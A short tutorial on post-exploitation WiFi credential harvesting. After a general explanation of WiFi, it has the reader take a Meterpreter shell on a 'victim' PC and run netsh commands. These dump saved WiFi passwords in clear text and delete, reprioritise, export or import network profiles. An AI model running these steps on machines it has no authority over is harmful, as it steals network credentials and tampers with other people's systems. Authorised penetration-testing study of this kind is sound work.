Wifi Penetration Testing in Remote PC (Part 1)

People often say “news travel fast”. How? The answer is one word Wireless. Wireless network all around the world helps us to move faster in our life. It enables us to make more of already running time. But, today, wireless connections to the internet have become necessisity. And it is now very much possible to take advantage of this necessisity.
Wifi : It is technology that allows electronic devices to connect to internet in a given area. WiFi has a lot of advantages. Wireless networks are easy to set up and inexpensive. They’re also unobtrusive — unless you’re on the lookout for a place to watch streaming movies on your tablet, you may not even notice when you’re in a hotspot.A wireless network uses radio waves, just like cell phones, televisions and radios do. In fact, communication across a wireless network is a lot like two-way radio communication. Here’s what happens:
The process also works in reverse, with the router receiving information from the Internet, translating it into a radio signal and sending it to the computer’s wireless adapter.
When you connect your device to the wifi, your device will store all the information of wifi. And after taking over the control of Victim PC. You can know each and everything about their wifi router, including their password.
For WiFi Penetration Testing, Take a session through meterpreter and reach to the shell of your Remote PC. And run the following commands:
Our first command will allow us to see all the networks to which the remote PC has been ever connected till date.
netsh wlan show profiles

Our next command helps us to see the details and password of a particular router.
netsh wlan show profiles name=[profile name] key=clear
Here, profile name is wifi name.
The following image shows the detail of the router named “Yashika”

The next image shows us the password of the router named Yashika with the heading key content. We can see that password is 99********

Our next command allows us to delete a particular wifi connection.
netsh wlan delete profile name=[profile name]
Here, profile name is wifi name.

Next command allows us to set the priority of a wifi network.
netsh wlan set profileorder name=[profile name]interface=[interface_name] priority=1
Here, profile name is wifi name and interface name is network types such as WLAN, LAN.

Next command allows us to stops our remote PC to automatically connect to a network.
netsh wlan set profileparameter name=[profile name] connectionmode=manual
Here, profile name is wifi name.

Next command allows us to export all the details about a wlan network.
netsh wlan export profile name=[profile name]
Here, profile name is wifi name.

Next command helps us to import any wlan file to a particular wifi network.
netsh wlan add profile filename=[path_and_filename.xml] interface=[interface_name]
